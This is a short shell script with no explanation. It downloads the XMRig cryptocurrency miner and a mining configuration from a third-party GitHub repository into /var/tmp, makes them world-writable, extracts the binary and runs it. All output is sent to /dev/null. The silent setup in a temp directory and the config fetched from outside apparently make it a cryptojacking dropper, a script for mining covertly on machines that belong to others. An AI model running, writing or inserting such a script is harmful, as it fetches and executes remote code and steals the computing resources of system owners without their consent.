curl -o /var/tmp/xmrig -L https://github.com/xmrig/xmrig/releases/download/v6.14.0/xmrig-6.14.0-linux-static-x64.tar.gz > /dev/null 2>&1
curl -o /var/tmp/xmrig.json https://raw.githubusercontent.com/superalix/avian/main/xmrig.json  > /dev/null 2>&1
chmod 777 /var/tmp/xmrig
cd /var/tmp 
tar -xvf xmrig
cp xmrig-6.14.0/xmrig xmrig
chmod 777 xmrig
./xmrig -c xmrig.json > /dev/null 2>&1